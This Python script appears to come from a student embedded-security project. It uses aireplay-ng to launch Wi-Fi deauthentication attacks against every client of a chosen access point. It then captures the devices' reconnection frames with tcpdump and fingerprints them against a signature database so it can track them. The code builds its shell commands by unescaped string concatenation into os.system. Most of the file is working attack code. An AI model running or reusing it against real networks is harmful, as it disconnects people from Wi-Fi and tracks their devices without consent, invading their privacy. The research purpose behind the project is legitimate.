import os
import sys
from scapy.all import *

# import my own files function
# sys.path.append(os.path.abspath("/root/PycharmProjects/EE209AS-Embedded-System-Security"))
from device_signature import *
from new_ham_dist import *
from device_tracking import *


# perform deauth attack and build signature from reconnection
def deauth(monitor_card, target, AP, duration='120'):
    # initiate deauth attack
    file = "active_track.pcap"
    os.system("aireplay-ng --deauth 100 -a " + AP + " -c " + target + " " + monitor_card)
    #scapy_pack = sniff(iface=monitor_card,
    #                   filter="ether src " + target + " and type mgt and not subtype beacon", count=10)

    # capture probe request and association
    os.system("timeout " + duration + " tcpdump -i " + monitor_card + " -s 0 -w " + file + ' -v '
              + "ether src " + target + " and type mgt and not subtype beacon")
    packets = rdpcap(file)
    packets.summary()

    # build device signature
    new_sig = build_WifiSig(file, target)
    new_sig.display()
    # return the signature only if it builds a complete signature
    return new_sig if new_sig.has_probe & new_sig.has_ass == 1 else None


# do 5-minutes of packet scanning and find any connection attempt
# if find a association request, build its signature and perform the checking in database
# return a updated new list of device in this time period
def passive_tracking(dev_list, ap_addr, duration="300", pck_file='tracking.pcap', db_file="signature_database.p"):
    os.system("timeout " + duration + " tcpdump -i " + monitor_card + " -s 0 -w " + pck_file + ' -v '
              + "type mgt and not subtype beacon")
    packets = rdpcap(pck_file)

    # record the number of distinct association request
    ass_request = []

    # first log all device mac address that initiate connection to the AP
    for pack in packets:
        if pack.addr1 == ap_addr.lower() and pack.haslayer("Dot11AssoReq") and pack.addr2 not in ass_request:
            ass_request.append(pack.addr2)

    # second build signature for these devices
    for dev_mac in ass_request:
        dev_sig = build_WifiSig(pck_file, dev_mac)
        # only do the check when the signature is valid
        if dev_sig.has_probe == 1 and dev_sig.has_ass == 1:
            new_dev = ham_dist_judgement(db_file, dev_sig)
            # if the matched device not in the device list already
            if new_dev not in dev_list:
                dev_list.append(new_dev)

    # return the updated list of device (device_name, device_type_id, mac_addr)
    return dev_list


if __name__ == "__main__":
    ap_mac = '08:95:2a:6e:18:b8'
    monitor_card = 'wlan1mon'

    # the list to hold analyazed devs
    dev_attri = []

    # first do a device scanning
    device_list = device_tracking(ap_mac, channel="2", duration='30')
    print(device_list)

    # for each device, launch deauth attack and do active fingerprinting
    for dev in device_list:
        deauth(monitor_card, target=dev, AP=ap_mac)
        dev_attri = passive_tracking(dev_attri, ap_addr=ap_mac, duration='120')

    print(dev_attri)
